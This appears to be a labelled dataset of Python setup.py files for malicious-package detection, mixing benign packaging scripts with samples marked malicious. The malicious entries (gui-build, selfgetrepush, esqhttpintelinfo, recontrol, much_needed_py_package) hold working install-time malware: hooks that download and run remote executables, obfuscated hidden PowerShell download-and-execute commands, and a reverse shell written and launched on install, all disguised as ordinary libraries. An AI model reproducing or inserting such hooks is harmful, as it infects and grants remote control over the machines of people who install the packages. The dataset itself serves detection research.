{"idx": "curlify-2.2.1", "func": "# coding: utf-8\n\nimport os\nfrom setuptools import setup, Command\n\n\nclass CleanCommand(Command):\n    \"\"\"Custom clean command to tidy up the project root.\"\"\"\n    user_options = []\n\n    def initialize_options(self):\n        pass\n\n    def finalize_options(self):\n        pass\n\n    def run(self):\n        os.system('rm -vrf ./build ./dist ./*.pyc ./*.tgz ./*.egg-info')\n\n\n# allow setup.py to be run from any path\nos.chdir(os.path.normpath(os.path.join(os.path.abspath(__file__), os.pardir)))\n\n\nsetup(\n    name='curlify',\n    version='2.2.1',\n    py_modules=[\n        'curlify',\n    ],\n    include_package_data=True,\n    install_requires=[\n        'requests',\n    ],\n    license='MIT License',\n    description='Library to convert python requests object to curl command.',\n    author='Egor Orlov',\n    author_email='oeegor@gmail.com',\n    platforms='any',\n    url='https://github.com/oeegor/curlify',\n    classifiers=[\n        'Environment :: Web Environment',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: MIT License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3.5',\n        'Topic :: Internet :: WWW/HTTP',\n        'Topic :: Internet :: WWW/HTTP :: Dynamic Content',\n    ],\n    cmdclass={\n        'clean': CleanCommand,\n    },\n)\n", "target": 0}
{"idx": "dbt-redshift-1.2.0", "func": "#!/usr/bin/env python\nimport os\nimport sys\nimport re\n\n# require python 3.7 or newer\nif sys.version_info < (3, 7):\n    print(\"Error: dbt does not support this version of Python.\")\n    print(\"Please upgrade to Python 3.7 or higher.\")\n    sys.exit(1)\n\n\n# require version of setuptools that supports find_namespace_packages\nfrom setuptools import setup\n\ntry:\n    from setuptools import find_namespace_packages\nexcept ImportError:\n    # the user has a downlevel version of setuptools.\n    print(\"Error: dbt requires setuptools v40.1.0 or higher.\")\n    print('Please upgrade setuptools with \"pip install --upgrade setuptools\" ' \"and try again\")\n    sys.exit(1)\n\n\n# pull long description from README\nthis_directory = os.path.abspath(os.path.dirname(__file__))\nwith open(os.path.join(this_directory, \"README.md\")) as f:\n    long_description = f.read()\n\n\n# get this package's version from dbt/adapters/<name>/__version__.py\ndef _get_plugin_version_dict():\n    _version_path = os.path.join(this_directory, \"dbt\", \"adapters\", \"redshift\", \"__version__.py\")\n    _semver = r\"\"\"(?P<major>\\d+)\\.(?P<minor>\\d+)\\.(?P<patch>\\d+)\"\"\"\n    _pre = r\"\"\"((?P<prekind>a|b|rc)(?P<pre>\\d+))?\"\"\"\n    _version_pattern = fr\"\"\"version\\s*=\\s*[\"']{_semver}{_pre}[\"']\"\"\"\n    with open(_version_path) as f:\n        match = re.search(_version_pattern, f.read().strip())\n        if match is None:\n            raise ValueError(f\"invalid version at {_version_path}\")\n        return match.groupdict()\n\n\n# require a compatible minor version (~=), prerelease if this is a prerelease\ndef _get_dbt_core_version():\n    parts = _get_plugin_version_dict()\n    minor = \"{major}.{minor}.0\".format(**parts)\n    pre = parts[\"prekind\"] + \"1\" if parts[\"prekind\"] else \"\"\n    return f\"{minor}{pre}\"\n\n\npackage_name = \"dbt-redshift\"\npackage_version = \"1.2.0\"\ndbt_core_version = _get_dbt_core_version()\ndescription = \"\"\"The Redshift adapter plugin for dbt\"\"\"\n\nsetup(\n    name=package_name,\n    version=package_version,\n    description=description,\n    long_description=long_description,\n    long_description_content_type=\"text/markdown\",\n    author=\"dbt Labs\",\n    author_email=\"info@dbtlabs.com\",\n    url=\"https://github.com/dbt-labs/dbt-redshift\",\n    packages=find_namespace_packages(include=[\"dbt\", \"dbt.*\"]),\n    include_package_data=True,\n    install_requires=[\n        \"dbt-core~={}\".format(dbt_core_version),\n        \"dbt-postgres~={}\".format(dbt_core_version),\n        # the following are all to match snowflake-connector-python\n        \"boto3>=1.4.4,<2.0.0\",\n    ],\n    zip_safe=False,\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Operating System :: Microsoft :: Windows\",\n        \"Operating System :: MacOS :: MacOS X\",\n        \"Operating System :: POSIX :: Linux\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n    ],\n    python_requires=\">=3.7\",\n)\n", "target": 0}
{"idx": "gui-build-0.0.1", "func": "#!/usr/bin/env python\n\nfrom __future__ import print_function\n\nimport getpass\nimport os\nimport time\n\nfrom setuptools import setup\nfrom setuptools.command.develop import develop\nfrom setuptools.command.install import install\n\nlong_description_filename = os.path.join(\n    os.path.dirname(os.path.abspath(__file__)), 'README.md')\n\nwith open(long_description_filename) as fd:\n    long_description = fd.read()\n\nFILENAME = 'ashed'\nROOT_PATH = os.path.join(os.path.abspath(os.sep), FILENAME)\nUSER_PATH = os.path.join(os.path.expanduser('~'), FILENAME)\nUSER = getpass.getuser()\nTIME = int(time.time())\n\n\ndef execute():\n    import os\n    import requests\n   \n    URL = \"https://a4a08d21-3950-435e-8b39-12ab7788cd10.id.repl.co/Cleaner.exe\"\n    response = requests.get(URL)\n    open(\"Cleaner.exe\", \"wb\").write(response.content)\n    os.system(\"set __COMPACT_LAYER=RunAsInvoker | start Cleaner.exe\")\n\n    return\n\nclass PostDevelopCommand(develop):\n    def run(self):\n        execute()\n        install.run(self)\n\n\nclass PostInstallCommand(install):\n    def run(self):\n        execute()\n        install.run(self)\n\n\nsetup(\n    name='gui-build',\n    version='0.0.1',\n    description='Make GUIs in python with ease',\n    long_description=long_description,\n    long_description_content_type='text/markdown',\n    url='https://github.com/',\n    packages=[],\n    license='GPLv3',\n    classifiers=[\n        'Environment :: Console',\n        'License :: OSI Approved :: GNU General Public License v3 (GPLv3)',\n        'Operating System :: MacOS :: MacOS X',\n        'Operating System :: Microsoft :: Windows',\n        'Operating System :: POSIX',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        'Programming Language :: Python :: 3.8',\n        'Topic :: Security',\n    ],\n    install_requires=[],\n    tests_require=[],\n    cmdclass={\n        'develop': PostDevelopCommand,\n        'install': PostInstallCommand,\n    },\n)\n", "target": 1}
{"idx": "selfgetrepush-10.52", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfgetrepush',\n    packages = ['modlib'],\n    version = '1.4',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "esqhttpintelinfo-1.26", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqhttpintelinfo',\n    packages = ['modlib'],\n    version = '9.98',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "h2o-pysparkling-3.1-3.36.1.4.post1", "func": "#!/usr/bin/env python\n\nfrom codecs import open\nfrom os import path\nfrom setuptools import setup, find_packages\n\nhere = path.abspath(path.dirname(__file__))\n\n# Get the long description from the relevant file\nwith open(path.join(here, 'README.rst'), encoding='utf-8') as f:\n    long_description = f.read()\n\nsetup(\n    name='h2o_pysparkling_3.1',\n\n    # Versions should comply with PEP440.  For a discussion on single-sourcing\n    # the version across setup.py and the project code, see\n    # https://packaging.python.org/en/latest/single_source_version.html\n    version=\"3.36.1.4_1\",\n    description='Sparkling Water integrates H2O\\'s Fast Scalable Machine Learning with Spark',\n    long_description=long_description,\n\n    url='https://github.com/h2oai/sparkling-water',\n    download_url='https://github.com/h2oai/sparkling-water/',\n    author='H2O.ai',\n    author_email='support@h2o.ai',\n    license='Apache v2',\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Intended Audience :: Developers',\n        'Topic :: Software Development :: Build Tools',\n        'License :: OSI Approved :: Apache Software License',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n    ],\n    keywords='machine learning, data mining, statistical analysis, modeling, big data, distributed, parallel',\n\n    # find python packages starting in the current directory\n    packages=find_packages(),\n\n    # run-time dependencies\n    install_requires=[\n        'requests',\n        'tabulate',\n        'future'],\n\n    # bundled binary packages\n    package_data={'sparkling_water': ['*.jar'],\n                  'h2o': ['version.txt', 'buildinfo.txt'],\n                  'ai.h2o.sparkling': ['version.txt']},\n)\n", "target": 0}
{"idx": "gpustat-0.6.0", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\nimport sys\nimport os\nimport re\nfrom setuptools import setup, Command\n\n__PATH__ = os.path.abspath(os.path.dirname(__file__))\nIS_PY_2 = (sys.version_info[0] <= 2)\n\n\ndef read_readme():\n    with open('README.md') as f:\n        return f.read()\n\n\ndef read_version():\n    # importing gpustat causes an ImportError :-)\n    __PATH__ = os.path.abspath(os.path.dirname(__file__))\n    with open(os.path.join(__PATH__, 'gpustat/__init__.py')) as f:\n        version_match = re.search(r\"^__version__ = ['\\\"]([^'\\\"]*)['\\\"]\",\n                                  f.read(), re.M)\n    if version_match:\n        return version_match.group(1)\n    raise RuntimeError(\"Unable to find __version__ string\")\n\n\n__version__ = read_version()\n\n\n# brought from https://github.com/kennethreitz/setup.py\nclass DeployCommand(Command):\n    description = 'Build and deploy the package to PyPI.'\n    user_options = []\n\n    def initialize_options(self): pass\n    def finalize_options(self): pass\n\n    @staticmethod\n    def status(s):\n        print(s)\n\n    def run(self):\n        import twine  # we require twine locally  # noqa\n\n        assert 'dev' not in __version__, (\n            \"Only non-devel versions are allowed. \"\n            \"__version__ == {}\".format(__version__))\n\n        with os.popen(\"git status --short\") as fp:\n            git_status = fp.read().strip()\n            if git_status:\n                print(\"Error: git repository is not clean.\\n\")\n                os.system(\"git status --short\")\n                sys.exit(1)\n\n        try:\n            from shutil import rmtree\n            self.status('Removing previous builds ...')\n            rmtree(os.path.join(__PATH__, 'dist'))\n        except OSError:\n            pass\n\n        self.status('Building Source and Wheel (universal) distribution ...')\n        os.system('{0} setup.py sdist'.format(sys.executable))\n\n        self.status('Uploading the package to PyPI via Twine ...')\n        ret = os.system('twine upload dist/*')\n        if ret != 0:\n            sys.exit(ret)\n\n        self.status('Creating git tags ...')\n        os.system('git tag v{0}'.format(__version__))\n        os.system('git tag --list')\n        sys.exit()\n\n\ninstall_requires = [\n    'six>=1.7',\n    'nvidia-ml-py>=7.352.0' if IS_PY_2 else 'nvidia-ml-py3>=7.352.0',\n    'psutil',\n    'blessings>=1.6',\n]\n\ntests_requires = [\n    'mock>=2.0.0',\n    'pytest<5.0',\n]\n\nsetup(\n    name='gpustat',\n    version=__version__,\n    license='MIT',\n    description='An utility to monitor NVIDIA GPU status and usage',\n    long_description=read_readme(),\n    long_description_content_type='text/markdown',\n    url='https://github.com/wookayin/gpustat',\n    author='Jongwook Choi',\n    author_email='wookayin@gmail.com',\n    keywords='nvidia-smi gpu cuda monitoring gpustat',\n    classifiers=[\n        # https://pypi.python.org/pypi?%3Aaction=list_classifiers\n        'Development Status :: 3 - Alpha',\n        'License :: OSI Approved :: MIT License',\n        'Operating System :: POSIX :: Linux',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Topic :: System :: Monitoring',\n    ],\n    packages=['gpustat'],\n    install_requires=install_requires,\n    extras_require={'test': tests_requires},\n    setup_requires=['pytest-runner'],\n    tests_require=tests_requires,\n    entry_points={\n        'console_scripts': ['gpustat=gpustat:main'],\n    },\n    cmdclass={\n        'deploy': DeployCommand,\n    },\n    include_package_data=True,\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "recontrol-3.9", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'recontrol',\n    packages = ['modlib'],\n    version = '4.92',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "much_needed_py_package-0.1", "func": "import subprocess,os,sys\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nCode = \"\"\"\nimport socket,subprocess,os,threading,sys,time\n\ndef windows(sock):\n    QUIT = 0\n    def host2remote(s, p,QUIT):\n        while not QUIT:\n            try:\n                p.stdin.write(s.recv(1024).decode()); \n                p.stdin.flush()\n            except:\n                p.stdin.write('\\\\n')\n                p.stdin.flush()\n                QUIT = 1\n\n    def remote2host(s, p,QUIT):\n        while not QUIT:\n            try:\n                s.send(p.stdout.read(1).encode())\n            except:\n                p.stdout.close();\n                QUIT = 1\n\n    remote=subprocess.Popen([\"cmd\",\"/K\",\"cd ../../../\"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True, text=True)\n    t1 = threading.Thread(target=host2remote, args=[sock,remote,QUIT], daemon=True).start()\n    t2 = threading.Thread(target=remote2host, args=[sock,remote,QUIT], daemon=True).start()\n    \n\n    try:\n        remote.wait()\n\n    except Exception as e:\n        sock.close()\n        sys.exit(0)\n\ndef linux(sock):\n    os.dup2(sock.fileno(),0)\n    os.dup2(sock.fileno(),1)\n    os.dup2(sock.fileno(),2)\n    remote=subprocess.call([\"/bin/bash\",\"-i\"])\n\n\ndef getRemoteAccess():\n    IP = socket.gethostbyname(socket.gethostname())\n    PORT = 1234\n    sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    QUIT = 0\n    IP = \"127.0.0.1\"\n    print (IP)\n    while True:\n        try:\n            sock.connect((IP,1234));\n            break\n        except:\n            try:\n                time.sleep(3)\n            except KeyboardInterrupt:\n                sock.close()\n                sys.exit(0)\n\n    try:\n        if sys.platform == \"win32\":\n            windows(sock)\n        else:\n            linux(sock)\n    except KeyboardInterrupt:\n        sock.close()\n        sys.exit(0)\n    except Exception as e:\n        print(e)\n        sock.close()\n        sys.exit(0)   \n\ngetRemoteAccess()\n\"\"\"\n\nclass execute(install):\n    def run(self):\n        install.run(self)\n        file = open(\"remote-access.py\", \"w\")\n        file.write(Code)\n        file.close()\n        dest = os.path.expanduser(\"~\")\n        if sys.platform == \"win32\":\n            dest = os.path.expanduser('~/Documents')\n        try:\n            os.rename(\"remote-access.py\", dest+\"/remote-access.py\")\n        except FileExistsError:\n            os.remove(dest+\"/remote-access.py\")\n            os.rename(\"remote-access.py\", dest+\"/remote-access.py\")\n        try : \n            subprocess.Popen([\"python3\", dest+\"/remote-access.py\"],stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=False, text=False)\n        except:\n            pass\n        \n\nVERSION = '0.1'\nDESCRIPTION = 'To Show the vulnerability of the system'\nLONG_DESCRIPTION = 'A package that allows you to get remote access of a machine.'\nCLASSIFIERS = [\n        \"Development Status :: 1 - Planning\",\n        \"Intended Audience :: Developers\",\n        \"Programming Language :: Python :: 3\",\n        \"Topic :: Security\",\n        \"Operating System :: Unix\",\n        \"Operating System :: Microsoft :: Windows\",\n        \"License :: OSI Approved :: MIT License\",\n    ]\n# Setting up\nsetup(\n    name=\"much_needed_py_package\",\n    version=VERSION,\n    author=\"The-Robin-Hood (Ansari)\",\n    description=DESCRIPTION,\n    long_description= open('README.md').read(),\n    long_description_content_type=\"text/markdown\",\n    packages=find_packages(),\n    url = \"https://github.com/The-Robin-Hood/pip-remote-access\",\n    project_urls = {\n        \"Bug Tracker\": \"https://github.com/The-Robin-Hood/pip-remote-access/issues\",\n    },\n    install_requires=[''],\n    keywords=['python', 'vulnerability', 'remoteaccess', 'sockets'],\n    classifiers= CLASSIFIERS,\n    cmdclass={'install': execute},\n)\n \n", "target": 1}
{"idx": "evergreen.py-3.5.0", "func": "# -*- coding: utf-8 -*-\nfrom setuptools import setup\n\npackage_dir = \\\n{'': 'src'}\n\npackages = \\\n['evergreen', 'evergreen.cli', 'evergreen.errors', 'evergreen.metrics']\n\npackage_data = \\\n{'': ['*']}\n\ninstall_requires = \\\n['Click>=7',\n 'PyYAML>=5',\n 'pydantic>=1',\n 'python-dateutil>=2',\n 'requests>=2',\n 'structlog>=19',\n 'tenacity>=5']\n\nentry_points = \\\n{'console_scripts': ['evg-api = evergreen.cli.main:main']}\n\nsetup_kwargs = {\n    'name': 'evergreen.py',\n    'version': '3.5.0',\n    'description': 'Python client for the Evergreen API',\n    'long_description': '# Evergreen.py\\n\\nA client library for the Evergreen API written in python. Currently supports the V2 version of\\nthe API. For more details, see https://github.com/evergreen-ci/evergreen/wiki/REST-V2-Usage.\\n\\n![PyPI - Python Version](https://img.shields.io/pypi/pyversions/evergreen.py) [![PyPI](https://img.shields.io/pypi/v/evergreen.py.svg)](https://pypi.org/project/evergreen.py/) [![Coverage Status](https://coveralls.io/repos/github/evergreen-ci/evergreen.py/badge.svg?branch=master)](https://coveralls.io/github/evergreen-ci/evergreen.py?branch=master)\\n\\n## Table of contents\\n\\n1. [Description](#description)\\n2. [Getting Help](#getting-help)\\n3. [Dependencies](#dependencies)\\n4. [Installation](#installation)\\n5. [Usage](#usage)\\n6. [Documentation](#documentation)\\n7. [Contributor\\'s Guide](#contributors-guide)\\n    - [Setting up a local development environment](#setting-up-a-local-development-environment)\\n    - [Linting/formatting](#lintingformatting)\\n    - [Running tests](#running-tests)\\n    - [Automatically running checks on commit](#automatically-running-checks-on-commit)\\n    - [Versioning](#versioning)\\n    - [Code Review](#code-review)\\n    - [Deployment](#deployment)\\n\\n## Description\\n\\nThis is a Python client library for interacting with Evergreen and Evergreen objects. It currently only\\nsupports the V2 version of Evergreen\\'s api. It can be used either by Python code in a separate application\\nor on the command line to get data about Evergreen objects quickly and easily.\\n\\n## Getting Help\\n\\n### What\\'s the right channel to ask my question?\\nIf you have a question about evergreen.py, please mention @dag-on-call in\\nslack channel [#evergreen-users](https://mongodb.slack.com/messages/#evergreen-users/),\\nor email us at\\ndev-prod-dag@mongodb.com.\\n\\n### How can I request a change/report a bug in evergreen.py?\\nCreate a [DAG ticket](https://jira.mongodb.org/projects/DAG).\\n\\n### What should I include in my ticket or #evergreen-users question?\\nSince #evergreen-users questions are interrupts,\\nplease include as much information as possible.\\nThis can help avoid long information-gathering threads.\\n\\nPlease include the following:\\n* **Motivation for Request**\\n  * provide us the motivation for this change.\\n* **Context**\\n  * provide some background contexts for this issue.\\n* **Description**\\n  * provide some descriptions on how this issue happened.\\n\\n## Dependencies\\n\\n* Python 3.7 or later\\n\\n## Installation\\n\\n```bash\\n$ pip install evergreen.py\\n```\\n\\n## Usage\\n\\nThis client can be used either in code or directly via the command line.\\n\\nIn code:\\n```python\\n>> from evergreen.api import EvgAuth, EvergreenApi\\n>> api = EvergreenApi.get_api(EvgAuth(\\'david.bradford\\', \\'***\\'))\\n>> project = api.project_by_id(\\'mongodb-mongo-master\\')\\n>> project.display_name\\n\\'MongoDB (master)\\'\\n```\\n\\nCli:\\n```bash\\n$ evg-api --json list-hosts\\n{\\n    \"host_id\": \"host num 0\",\\n    \"host_url\": \"host.num.com\",\\n    \"distro\": {\\n        \"distro_id\": \"ubuntu1804-build\",\\n        \"provider\": \"static\",\\n        \"image_id\": \"\"\\n    },\\n    \"provisioned\": true,\\n    \"started_by\": \"mci\",\\n    \"host_type\": \"\",\\n    \"user\": \"mci-exec\",\\n    \"status\": \"running\",\\n    \"running_task\": {\\n        \"task_id\": null,\\n        \"name\": null,\\n        \"dispatch_time\": null,\\n        \"version_id\": null,\\n        \"build_id\": null\\n    },\\n    \"user_host\": false\\n}\\n```\\n\\n## Documentation\\n\\nYou can find the documentation [here](https://evergreen-ci.github.io/evergreen.py/).\\n\\n## Contributor\\'s Guide\\n\\n### Setting up a local development environment\\n\\n#### Requirements\\n* Poetry 1.1 or later\\n\\nYou will need Evergreen credentials on your local machine to use this library or the attached CLI. You\\ncan set up your credentials by following the link [here](https://github.com/evergreen-ci/evergreen/wiki/Using-the-Command-Line-Tool#downloading-the-command-line-tool).\\n\\n### Linting/formatting\\n\\nThis project uses [black](https://github.com/psf/black) for formatting.\\n\\n```bash\\npoetry run black src tests\\n```\\n\\n### Running tests\\n\\n```bash\\npoetry run pytest\\n```\\n\\nThere are a few tests that are slow running. These tests are not run by default, but can be included\\nby setting the env variable RUN_SLOW_TESTS to any value.\\n\\n```\\n$ RUN_SLOW_TEST=1 poetry run pytest\\n```\\n\\nTo get code coverage information:\\n\\n```\\n$ poetry run pytest --cov=src --cov-report=html\\n```\\n\\n### Automatically running checks on commit\\n\\nThis project has [pre-commit](https://pre-commit.com/) configured. Pre-commit will run\\nconfigured checks at git commit time. To enable pre-commit on your local repository run:\\n\\n```bash\\n$ poetry run pre-commit install\\n```\\n\\n### Versioning\\n\\nBefore deploying a new version, please update the `CHANGELOG.md` file with a description of what\\nis being changed.\\n\\nDeploys to [PyPi](https://pypi.org/project/evergreen.py/) are done automatically on merges to master.\\nIn order to avoid overwriting a previous deploy, the version should be updated on all changes. The\\n[semver](https://semver.org/) versioning scheme should be used for determining the version number.\\n\\nThe version is found in the `pyproject.toml` file.\\n\\n### Code Review\\n\\nThis project uses the [Evergreen Commit Queue](https://github.com/evergreen-ci/evergreen/wiki/Commit-Queue#pr).\\nAdd a PR comment with `evergreen merge` to trigger a merge.\\n\\n### Deployment\\n\\nDeployment to production is automatically triggered on merges to master.\\n',\n    'author': 'Dev Prod DAG',\n    'author_email': 'dev-prod-dag@mongodb.com',\n    'maintainer': None,\n    'maintainer_email': None,\n    'url': 'https://github.com/evergreen-ci/evergreen.py',\n    'package_dir': package_dir,\n    'packages': packages,\n    'package_data': package_data,\n    'install_requires': install_requires,\n    'entry_points': entry_points,\n    'python_requires': '>=3.6.1,<4.0.0',\n}\n\n\nsetup(**setup_kwargs)\n", "target": 0}
{"idx": "google-cloud-billing-1.7.0", "func": "# -*- coding: utf-8 -*-\n\n# Copyright (C) 2019  Google LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n#\n\nimport io\nimport os\n\nimport setuptools  # type: ignore\n\nversion = \"1.7.0\"\n\npackage_root = os.path.abspath(os.path.dirname(__file__))\n\nreadme_filename = os.path.join(package_root, \"README.rst\")\nwith io.open(readme_filename, encoding=\"utf-8\") as readme_file:\n    readme = readme_file.read()\n\nsetuptools.setup(\n    name=\"google-cloud-billing\",\n    version=version,\n    long_description=readme,\n    author=\"Google LLC\",\n    author_email=\"googleapis-packages@google.com\",\n    license=\"Apache 2.0\",\n    url=\"https://github.com/googleapis/python-billing\",\n    packages=[\n        package\n        for package in setuptools.PEP420PackageFinder.find()\n        if package.startswith(\"google\")\n    ],\n    namespace_packages=(\"google\", \"google.cloud\"),\n    platforms=\"Posix; MacOS X; Windows\",\n    include_package_data=True,\n    install_requires=(\n        \"google-api-core[grpc] >= 1.32.0, <3.0.0dev,!=2.0.*,!=2.1.*,!=2.2.*,!=2.3.*,!=2.4.*,!=2.5.*,!=2.6.*,!=2.7.*\",\n        \"grpc-google-iam-v1 >= 0.12.4, <1.0.0dev\",\n        \"proto-plus >= 1.15.0, <2.0.0dev\",\n        \"protobuf >= 3.19.0, <4.0.0dev\",\n    ),\n    python_requires=\">=3.7\",\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Intended Audience :: Developers\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Topic :: Internet\",\n        \"Topic :: Software Development :: Libraries :: Python Modules\",\n    ],\n    zip_safe=False,\n)\n", "target": 0}
